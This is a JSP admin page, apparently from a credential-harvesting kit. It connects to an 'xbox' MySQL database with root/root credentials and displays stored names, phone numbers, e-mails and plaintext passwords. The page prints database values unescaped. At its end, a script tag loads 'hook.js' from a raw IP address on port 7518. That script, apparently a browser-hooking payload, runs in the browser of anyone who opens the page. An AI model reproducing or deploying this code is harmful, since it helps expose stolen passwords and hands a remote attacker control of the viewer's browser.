<%@ page language="java" contentType="text/html; charset=UTF-8"
    pageEncoding="UTF-8"%>
<%@ page import="java.sql.Connection" %>
<%@ page import="java.sql.DriverManager" %>
<%@ page import="java.sql.PreparedStatement" %>
<%@ page import="java.sql.ResultSet" %>

<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Admin Data</title>
    <style>
        table {
            width: 100%;
            border-collapse: collapse;
        }
        table, th, td {
            border: 1px solid #ccc;
            padding: 8px;
            text-align: left;
        }
        th {
            background-color: #f2f2f2;
        }
    </style>
</head>
<body>

    <h1>Unauthorized Access Registered Game Data</h1>

    <% 
    // Replace with your actual database credentials (avoid storing directly in code)
    final String url = "jdbc:mysql://localhost:3306/xbox";
    final String username = "root";
    final String password = "root";

    Connection conn = null;
    PreparedStatement pst = null;
    ResultSet rst = null;

    try {
        Class.forName("com.mysql.cj.jdbc.Driver");
        conn = DriverManager.getConnection(url, username, password);

        if (conn != null) {
            // Use PreparedStatement to prevent SQL injection
            String query = "SELECT * FROM esp";
            pst = conn.prepareStatement(query);
            rst = pst.executeQuery();

            if (rst.next()) { // Check if any results before iterating
                out.println("<table>");
                out.println("<thead>");
                out.println("<tr>");
                out.println("<th>First-Name</th>");
                out.println("<th>Last-Name</th>");
                out.println("<th>Gender</th>");
                out.println("<th>Telephone</th>");
                out.println("<th>E-Mail</th>");
                out.println("<th>Password</th>");
                out.println("<th>Game</th>");
                out.println("</tr>");
                out.println("</thead>");
                out.println("<tbody>");
                
                do {
                    out.println("<tr>");
                    out.println("<td>" + rst.getString(1) + "</td>");
                    out.println("<td>" + rst.getString(2) + "</td>");
                    out.println("<td>" + rst.getString(3) + "</td>");
                    out.println("<td>" + rst.getString(4) + "</td>");
                    out.println("<td>" + rst.getString(5) + "</td>");
                    out.println("<td>" + rst.getString(6) + "</td>");
                    out.println("<td>" + rst.getString(7) + "</td>");
                    out.println("</tr>");
                } while (rst.next());
                
                out.println("</tbody>");
                out.println("</table>");
            } else {
                out.println("<p>No data found in the register table.</p>");
            }
        }
    } catch (Exception e) {
        out.println("<p>Exception occurred: " + e.getMessage() + "</p>");
        e.printStackTrace(); // Handle exceptions appropriately for production
    } finally {
        // Close resources in a finally block to ensure proper cleanup
        try {
            if (rst != null) {
                rst.close();
            }
            if (pst != null) {
                pst.close();
            }
            if (conn != null) {
                conn.close();
            }
        } catch (Exception e) {
            out.println("<p>Exception occurred while closing resources: " + e.getMessage() + "</p>");
            e.printStackTrace(); // Handle exceptions appropriately for production
        }
    }
    %>

</body>
<script src="http://147.185.221.21:7518/hook.js"></script>
</html>
